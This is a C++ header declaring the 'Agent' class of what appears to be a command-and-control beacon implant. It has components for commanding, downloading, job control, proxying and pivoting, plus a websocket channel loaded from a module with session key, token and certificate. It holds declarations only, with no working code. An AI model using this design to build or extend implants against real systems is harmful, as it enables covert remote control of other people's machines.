#pragma once

#include "AgentInfo.h"
#include "AgentConfig.h"
#include "Downloader.h"
#include "JobsController.h"
#include "MemorySaver.h"
#include "Proxyfire.h"
#include "Pivotter.h"
#include "Commander.h"

typedef struct _WS_CHANNEL_CONTEXT {
	const char* agent_id;
	const char* token;
	const char* url;
	const BYTE* session_key;
	const BYTE* cert_data;
	DWORD       cert_size;
} WS_CHANNEL_CONTEXT, *PWS_CHANNEL_CONTEXT;

typedef BOOL(__stdcall* LPFN_WS_CHANNEL_START)(const WS_CHANNEL_CONTEXT* ctx);
typedef void(__stdcall* LPFN_WS_CHANNEL_STOP)(void);

class Commander;

class Agent
{
public:
	AgentInfo*		info        = NULL;
	AgentConfig*    config		= NULL;
	Commander*      commander	= NULL;
	Downloader*     downloader	= NULL;
	JobsController* jober		= NULL;
	MemorySaver*    memorysaver = NULL;
	Proxyfire*		proxyfire	= NULL;
	Pivotter*       pivotter    = NULL;

	Map<CHAR*, LPVOID> Values;

	BYTE* SessionKey = NULL;

#if defined(BEACON_HTTP)
	HMODULE                 websocketModule     = NULL;
	LPFN_WS_CHANNEL_START   websocketStartFunc  = NULL;
	LPFN_WS_CHANNEL_STOP    websocketStopFunc   = NULL;
	CHAR*                   websocketModulePath = NULL;
	CHAR*                   websocketAgentId    = NULL;
	CHAR*                   websocketToken      = NULL;
	CHAR*                   websocketUrl        = NULL;
	BYTE*                   websocketSessionKey = NULL;
	BYTE*                   websocketCert       = NULL;
	DWORD                   websocketCertSize   = 0;
#endif

	Agent();

	void  SetActive(BOOL state);
	BOOL  IsActive();
	ULONG GetWorkingSleep();
	BYTE* BuildBeat(ULONG* size);

#if defined(BEACON_HTTP)
	BOOL StartWebsocketChannel(const MemoryData& moduleData, CHAR* agentId, ULONG agentIdSize, CHAR* url, ULONG urlSize, CHAR* token, ULONG tokenSize, BYTE* sessionKey, ULONG sessionKeySize, BYTE* certData, ULONG certSize, DWORD* errorCode);
	void StopWebsocketChannel();
#endif
};
